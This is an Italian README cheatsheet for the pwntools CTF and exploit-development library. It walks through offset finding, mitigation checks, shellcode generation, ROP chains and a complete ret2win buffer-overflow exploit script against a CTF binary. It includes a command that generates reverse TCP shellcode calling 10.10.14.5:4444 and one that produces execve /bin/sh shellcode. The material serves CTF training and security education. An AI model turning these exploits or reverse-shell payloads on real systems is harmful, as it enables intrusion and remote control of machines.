<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pwntools Cheatsheet

[pwntools](https://github.com/Gallopsled/pwntools) è un framework CTF di prima qualità e una libreria di sviluppo di exploit scritta in Python. Progettato per la prototipazione rapida, lo sfruttamento binario (pwn) e il reverse engineering, fornisce una suite completa di strumenti da riga di comando (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) insieme a un'API Python di alto livello per l'interazione con processi locali e socket remoti.

---

## Sommario

- [Funzionalità principali](#capacità-core)
- [Installazione](#installazione)
- [Utilità della riga di comando (`pwn <cmd>`)](#utilità-della-riga di comando-pwn-cmd)
  - [`pwn cyclic` (Calcolo dell'offset del buffer)](#pwn-calcolo-dell'offset-del-buffer-ciclico)
  - [`pwn checksec` (ispezione di mitigazione)](#pwn-checksec-mitigazione-ispezione)
  - [`pwn asm` e `pwn disasm` (Assemblatore/Disassemblatore)](#pwn-asm--pwn-disasm-assemblatore--disassemblatore)
  - [`pwn shellcraft` (generatore di shellcode)](#pwn-shellcraft-shellcode-generatore)
  - [`pwn template` (Generatore di scheletro di exploit)](#pwn-template-exploit-skeleton-generator)
- [Flusso di lavoro di sviluppo dell'exploit Python](#flusso di lavoro-di-sviluppo-exploit-python)
  - [Connessioni al processo e al socket remoto](#processo--connessioni-socket-remote)
  - [Analisi e simboli ELF](#elf-parsing--simboli)
  - [Costruzione catena ROP](#costruzione-catena-rop)
  - [Packing ed Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Esempio di exploit completo (Buffer Overflow + ret2win)](#exploit-completo-esempio-buffer-overflow--ret2win)

---

## Funzionalità principali

- **Architettura Tubes:** Interfaccia unificata per l'interazione con processi locali (`process`), socket TCP remoti (`remote`) e sessioni SSH (`ssh`).
- **Ispezione binari e gadget:** Risoluzione automatizzata dei simboli ELF, ricerca GOT/PLT e sintesi automatizzata della catena ROP.
- **Assemblaggio al volo:** Traduzione istantanea tra mnemonici di assemblaggio e codici operativi su x86, x86_64, ARM, MIPS e AArch64.
- **Sintesi shellcode:** modelli shellcode precostruiti e personalizzabili per shell inverse, execve, lettura di file ed evasione.

---

## Installazione
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Utilità della riga di comando (`pwn <cmd>`)

### `pwn cyclic` (Calcolo dell'offset del buffer)
Genera modelli ciclici De Bruijn unici per determinare l'esatto offset del crash (sovrascrittura EIP/RIP):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (Ispezione di mitigazione)
Controlla le mitigazioni della sicurezza (Canary, NX, PIE, RELRO, ASLR) di qualsiasi eseguibile ELF:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` e `pwn disasm` (Assemblatore/Disassemblatore)
Assembla le istruzioni in byte di shellcode direttamente dal terminale:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Generatore di codici shell)
Genera payload shellcode pronti per la produzione direttamente sullo stdout del terminale o su file binari:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (Generatore di scheletri di exploit)
Genera un modello di exploit Python testato sul campo per un binario di destinazione e un server remoto:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Flusso di lavoro per lo sviluppo degli exploit Python

### Connessioni al processo e al socket remoto
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### Analisi e simboli ELF
Leggi automaticamente gli indirizzi delle funzioni, le tabelle GOT e PLT senza ricerche GDB manuali:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### Costruzione di catene ROP
Costruisci automaticamente catene di programmazione orientata al ritorno (ROP):
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Imballaggio ed Endianness (`p32` / `p64`)
Converti indirizzi di memoria interi in byte little-endian:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Esempio di exploit completo (Buffer Overflow + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```